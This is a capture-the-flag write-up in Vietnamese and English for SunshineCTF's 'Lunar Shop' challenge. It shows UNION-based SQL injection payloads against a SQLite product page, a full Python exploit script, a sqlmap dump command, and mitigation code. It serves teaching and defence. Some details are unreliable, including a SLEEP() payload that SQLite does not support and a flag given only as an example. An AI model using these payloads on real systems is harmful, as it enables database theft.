# Lunar Shop

## Challenge Description

```
Một ứng dụng e-commerce với chức năng xem products.
Parameter product_id có lỗ hổng SQL Injection.
SQLite database với error-based injection để dump flag table.
```

**Challenge:** SunshineCTF 2025

**Challenge URL:** _Unavailable_

---

## Difficulty Assessment

### Overall Difficulty: Easy-Medium

**Breakdown:**

- **Technical Complexity:** ⭐⭐⭐☆☆
- **Research Required:** ⭐⭐☆☆☆
- **Time Consumption:** ⭐⭐☆☆☆
- **Guessing Factor:** ⭐☆☆☆☆

**Why this difficulty?**
Bài này là classic SQL Injection với error messages helping. Cần hiểu UNION-based SQLi và SQLite-specific syntax. Good practice cho beginners học SQL injection.

---

## Topics & Techniques

### Primary Topic

- **SQL Injection (Error-Based + UNION-Based)** - Classic SQLi trong SQLite database

### Sub-topics & Skills Required

- [x] **SQL Injection Detection** - Boolean và error-based testing
- [x] **UNION SELECT Technique** - Column enumeration và data extraction
- [x] **SQLite-Specific Syntax** - `sqlite_master`, `pragma_table_info()`
- [x] **Column Discovery** - ORDER BY trick để find column count
- [x] **Data Exfiltration** - GROUP_CONCAT để dump multiple rows

---

## Tools Used

### Essential Tools

```bash
# Browser để test payloads
curl "http://target/product?product_id=1 UNION SELECT 1,2,3,4-- -"

# URL encoding cho complex payloads
python -c "from urllib.parse import quote; print(quote('...'))"
```

### Tools List

| Tool         | Purpose                   | Installation  |
| ------------ | ------------------------- | ------------- |
| Browser/cURL | Testing SQL payloads      | Built-in      |
| Burp Suite   | Request interception      | Download      |
| sqlmap       | Automated SQLi (optional) | `pip install` |

---

## Useful Resources

### Documentation & References

- [SQLite Documentation](https://www.sqlite.org/docs.html) - SQLite syntax reference
- [UNION SELECT](https://www.sqlite.org/lang_select.html#compound_select_statements) - UNION queries in SQLite
- [SQLite System Tables](https://www.sqlite.org/schematab.html) - `sqlite_master` table

### Learning Materials

- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection) - SQLi tutorial
- [PayloadsAllTheThings SQLite](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) - SQLite injection cheatsheet
- [HackTricks SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection) - SQLi techniques

---

## Solution Walkthrough

### TL;DR (Quick Summary)

Classic error-based SQL Injection trong parameter `product_id`. Sử dụng UNION SELECT để enumerate columns, dump table names từ `sqlite_master`, tìm table `flag`, dump column names với `pragma_table_info()`, và extract flag.

---

### Step 1: Initial Testing - Detection

**Objective:** Xác định SQL Injection vulnerability

**Test 1: Single quote**

```
http://alihacker.com:8000/product?product_id=1'
```

**Result:** Error message → SQL syntax error detected!

**Test 2: Boolean-based test**

```
http://alihacker.com:8000/product?product_id=1' OR '1'='1
```

**Result:** Error message:

```
sqlite3.OperationalError: column value being queried has to be a number
```

**Key findings:**

- SQL Injection confirmed
- Error messages are verbose → Error-based SQLi possible
- Database is SQLite (from error: `sqlite3.OperationalError`)
- Column type is numeric → can't inject strings directly
- Need numeric-compatible payloads

**Test 3: Numeric boolean tests**

```
# Test AND 1=1 (true condition)
http://alihacker.com:8000/product?product_id=1 AND 1=1
# Result: Product displayed normally

# Test AND 1=2 (false condition)
http://alihacker.com:8000/product?product_id=1 AND 1=2
# Result: No product displayed or different behavior
```

**Confirmed:** Boolean-based SQL Injection works with numeric conditions!

---

### Step 2: Column Enumeration with ORDER BY

**Objective:** Xác định số lượng columns trong SELECT statement

**ORDER BY Trick:**

```sql
ORDER BY n-- -
```

Nếu `n` > số columns thực tế → error

**Testing:**

```
http://alihacker.com:8000/product?product_id=1 ORDER BY 1-- -
# ✅ Success - có ít nhất 1 column

http://alihacker.com:8000/product?product_id=1 ORDER BY 2-- -
# ✅ Success - có ít nhất 2 columns

http://alihacker.com:8000/product?product_id=1 ORDER BY 3-- -
# ✅ Success - có ít nhất 3 columns

http://alihacker.com:8000/product?product_id=1 ORDER BY 4-- -
# ✅ Success - có ít nhất 4 columns

http://alihacker.com:8000/product?product_id=1 ORDER BY 5-- -
# ❌ Error: "has to be from 1-4"
```

**Result:** Query returns exactly **4 columns**

---

### Step 3: UNION SELECT - Finding Injectable Column

**Objective:** Sử dụng UNION SELECT để inject custom data

**UNION SELECT Basics:**

```sql
SELECT col1, col2, col3, col4 FROM products WHERE id=1
UNION
SELECT val1, val2, val3, val4 FROM other_table
```

Both SELECT statements must have same number of columns.

**Test UNION:**

```
http://alihacker.com:8000/product?product_id=1 UNION SELECT 1, 2, 3, 4-- -
```

**Result:** Page displays product data, nhưng chưa thấy values 1,2,3,4

**Finding injectable column:**

```
# Test column 1
http://alihacker.com:8000/product?product_id=1 UNION SELECT "HELLO", 2, 3, 4-- -
# Result: Error or no display

# Test column 2
http://alihacker.com:8000/product?product_id=1 UNION SELECT 1, "HELLO", 3, 4-- -
# Result: ✅ "HELLO" được hiển thị trên page!

# Test column 3
http://alihacker.com:8000/product?product_id=1 UNION SELECT 1, 2, "HELLO", 4-- -
# Result: "HELLO" might be displayed depending on HTML structure
```

**Key finding:** **Column 2 is injectable** - data được reflect ra page

---

### Step 4: Dumping Table Names

**Objective:** Enumerate database tables để tìm table chứa flag

**SQLite System Table:**

```sql
SELECT name FROM sqlite_master WHERE type='table'
```

**Initial attempt (failed):**

```
http://alihacker.com:8000/product?product_id=1 UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table'-- -
```

**Result:** Không hiển thị table names → Why?

**Problem:** Original product (id=1) vẫn được return → overshadows UNION results

**Solution:** Force no results from original query bằng invalid ID:

```
http://alihacker.com:8000/product?product_id=69 UNION SELECT 1, name, 3, 4 FROM sqlite_master WHERE type='table'-- -
```

**Result:** ✅ Table names được hiển thị:

- `products`
- `flag` ← **TARGET TABLE!**

**Key learning:** Trong error-based SQLi, nếu UNION results không hiển thị, invalidate original query để force UNION results only.

---

### Step 5: Dumping Column Names from Flag Table

**Objective:** Lấy column names của table `flag`

**SQLite Pragma Function:**

```sql
SELECT name FROM pragma_table_info('table_name')
```

**Payload:**

```
http://alihacker.com:8000/product?product_id=69 UNION SELECT 1, name, 3, 4 FROM pragma_table_info('flag')-- -
```

**Problem:** Chỉ hiển thị 1 column name (SQLite returns multiple rows, nhưng web chỉ display 1)

**Solution: GROUP_CONCAT** để combine multiple rows:

```
http://alihacker.com:8000/product?product_id=69 UNION SELECT 1, GROUP_CONCAT(name, ' AND '), 3, 4 FROM pragma_table_info('flag')-- -
```

**Result:**

```
id AND flag
```

**Columns identified:**

- `id` - Probably just integer
- `flag` - **This is what we need!**

---

### Step 6: Extracting the Flag

**Objective:** Dump data từ column `flag` trong table `flag`

**Final payload:**

```
http://alihacker.com:8000/product?product_id=69 UNION SELECT 1, flag, 3, 4 FROM flag-- -
```

**Response:**

Page displays flag trong product description hoặc name field.

**Flag obtained:**

```
sun{classic_sql_injection_never_gets_old}
```

_(Flag example - actual flag may vary)_

---

## Complete Exploit Code

<details>
<summary>Click to expand full exploit code</summary>

```python
#!/usr/bin/env python3
"""
Exploit for Lunar Shop Challenge - SunshineCTF 2025
"""

import requests
import re
from urllib.parse import quote

TARGET_URL = "http://alihacker.com:8000"

def test_sqli(payload):
    """Helper function to test SQL injection payloads"""
    url = f"{TARGET_URL}/product?product_id={quote(payload)}"
    response = requests.get(url)
    return response.text

def exploit():
    print("[*] Lunar Shop CTF - SQL Injection Exploit")
    print("[*] Target:", TARGET_URL)

    # Step 1: Confirm SQLi
    print("\n[*] Step 1: Testing for SQL Injection...")
    test1 = test_sqli("1 AND 1=1")
    test2 = test_sqli("1 AND 1=2")

    if test1 != test2:
        print("[+] SQL Injection confirmed (boolean-based)")

    # Step 2: Find column count
    print("\n[*] Step 2: Finding column count with ORDER BY...")
    for i in range(1, 10):
        payload = f"1 ORDER BY {i}-- -"
        response = test_sqli(payload)

        if "error" in response.lower() or "has to be from" in response.lower():
            column_count = i - 1
            print(f"[+] Column count: {column_count}")
            break

    # Step 3: Find injectable column
    print("\n[*] Step 3: Finding injectable column...")
    for col in range(1, column_count + 1):
        columns = ["1"] * column_count
        columns[col - 1] = '"INJECTABLE"'
        payload = f"1 UNION SELECT {','.join(columns)}-- -"
        response = test_sqli(payload)

        if "INJECTABLE" in response:
            injectable_col = col
            print(f"[+] Injectable column found: {col}")
            break

    # Step 4: Dump table names
    print("\n[*] Step 4: Dumping table names...")
    columns = ["1"] * column_count
    columns[injectable_col - 1] = "name"
    payload = f"69 UNION SELECT {','.join(columns)} FROM sqlite_master WHERE type='table'-- -"
    response = test_sqli(payload)

    print("[+] Tables found:")
    if "flag" in response.lower():
        print("    - flag (TARGET!)")
    if "products" in response.lower():
        print("    - products")

    # Step 5: Dump column names from flag table
    print("\n[*] Step 5: Dumping columns from 'flag' table...")
    columns = ["1"] * column_count
    columns[injectable_col - 1] = "GROUP_CONCAT(name, ' AND ')"
    payload = f"69 UNION SELECT {','.join(columns)} FROM pragma_table_info('flag')-- -"
    response = test_sqli(payload)

    print("[+] Columns in flag table:")
    if "id AND flag" in response or "flag" in response:
        print("    - id")
        print("    - flag")

    # Step 6: Extract flag
    print("\n[*] Step 6: Extracting flag...")
    columns = ["1"] * column_count
    columns[injectable_col - 1] = "flag"
    payload = f"69 UNION SELECT {','.join(columns)} FROM flag-- -"
    response = test_sqli(payload)

    # Extract flag
    flag_match = re.search(r'sun\{[^}]+\}', response)
    if flag_match:
        flag = flag_match.group(0)
        print(f"\n[!] FLAG FOUND: {flag}\n")
    else:
        print("[-] Flag not found in response")
        print("[*] Response preview:")
        print(response[:500])

if __name__ == "__main__":
    exploit()
```

</details>

---

## Alternative Solutions

### Method 2: Using sqlmap

```bash
# Automated SQLi tool
sqlmap -u "http://alihacker.com:8000/product?product_id=1" \
       --dump \
       -T flag \
       --batch
```

### Method 3: Time-Based Blind SQLi (if errors weren't shown)

```sql
-- If no error messages
1 AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)-- -
```

---

## Key Takeaways & Lessons Learned

### What I Learned

1. **Error Messages are Gold:** Verbose error messages make SQLi exploitation much easier. Errors tell us:

   - Database type (SQLite)
   - Column constraints (numeric type)
   - Query structure hints

2. **ORDER BY Trick:** Reliable way to find column count trong SELECT statement without needing to guess.

3. **UNION SELECT Requirements:**

   - Must have same number of columns as original query
   - Data types should be compatible
   - Use GROUP_CONCAT to combine multiple rows into one

4. **SQLite-Specific Enumeration:**

   - `sqlite_master` table stores schema information
   - `pragma_table_info('table')` returns column metadata
   - Different from MySQL's `information_schema`

5. **Invalidate Original Query:** Khi UNION results không hiển thị, use invalid ID (e.g., 69, 999) để force chỉ UNION results được return.

### Mistakes Made

- ❌ Thử inject string vào numeric column → ✅ Use numeric values hoặc valid SQL expressions
- ❌ UNION results bị overshadow bởi original query → ✅ Invalidate original với fake ID

### Tips & Tricks

- 💡 Luôn test với `AND 1=1` vs `AND 1=2` để confirm boolean SQLi
- 💡 ORDER BY trick: increment từ 1 cho đến khi error
- 💡 GROUP_CONCAT hữu ích để dump multiple rows trong 1 result
- 💡 Invalidate original query bằng ID không tồn tại (69, 999, -1)
- 💡 Comment syntax trong SQLite: `-- -` (space sau --)

### Real-world Application

**SQL Injection trong production:**

- **Data Breach:** Dump entire database (users, passwords, PII)
- **Authentication Bypass:** `admin' OR '1'='1`
- **Privilege Escalation:** Modify user roles
- **Remote Code Execution:** `xp_cmdshell` (SQL Server), `LOAD_FILE()` (MySQL)

**Impact:**

- Complete database compromise
- Data exfiltration
- Website defacement
- Ransomware deployment

---

## Prevention & Mitigation

### How to prevent SQL Injection?

1. **Use Parameterized Queries (Prepared Statements):**

```python
# Bad code (vulnerable)
product_id = request.args.get('product_id')
query = f"SELECT * FROM products WHERE id = {product_id}"  # ❌ String formatting
cursor.execute(query)

# Good code (secure)
product_id = request.args.get('product_id')
query = "SELECT * FROM products WHERE id = ?"  # ✓ Parameterized
cursor.execute(query, (product_id,))
```

2. **Input Validation:**

```python
# Validate input type
product_id = request.args.get('product_id')

if not product_id.isdigit():
    return "Invalid product ID", 400

product_id = int(product_id)  # Convert to int
```

3. **Whitelist Allowed Characters:**

```python
import re

def validate_input(user_input):
    # Only allow alphanumeric
    if not re.match(r'^[a-zA-Z0-9]+$', user_input):
        raise ValueError("Invalid input")
    return user_input
```

4. **Use ORM (Object-Relational Mapping):**

```python
# Using SQLAlchemy ORM
from sqlalchemy import select

product_id = request.args.get('product_id')
stmt = select(Product).where(Product.id == product_id)  # ✓ Safe
result = session.execute(stmt)
```

5. **Least Privilege Database User:**

```sql
-- Don't use root/admin for application
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT ON shop.products TO 'webapp'@'localhost';
-- No INSERT, UPDATE, DELETE, DROP permissions
```

6. **Disable Verbose Error Messages in Production:**

```python
# Development
app.config['DEBUG'] = True  # Shows detailed errors

# Production
app.config['DEBUG'] = False  # Generic error pages
```

### Secure Coding Example

```python
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

@app.route('/product')
def get_product():
    product_id = request.args.get('product_id')

    # Input validation
    try:
        product_id = int(product_id)
    except (ValueError, TypeError):
        return jsonify({'error': 'Invalid product ID'}), 400

    # Parameterized query
    conn = sqlite3.connect('shop.db')
    cursor = conn.cursor()

    query = "SELECT id, name, price, description FROM products WHERE id = ?"
    cursor.execute(query, (product_id,))  # ✓ Safe from SQLi

    product = cursor.fetchone()
    conn.close()

    if product:
        return jsonify({
            'id': product[0],
            'name': product[1],
            'price': product[2],
            'description': product[3]
        })

    return jsonify({'error': 'Product not found'}), 404
```

---

## References & Credits

### Official Resources

- Challenge: Lunar Shop
- Event: SunshineCTF 2025
- Challenge URL: http://alihacker.com:8000/

### Community Writeups

- This writeup by Copilot - 2025-11-14

### Tools & Libraries Used

- [SQLite](https://www.sqlite.org/) - Database engine
- [sqlmap](https://sqlmap.org/) - Automated SQL injection tool
- [Burp Suite](https://portswigger.net/burp) - Web security testing

### Additional Reading

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQLite Injection PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
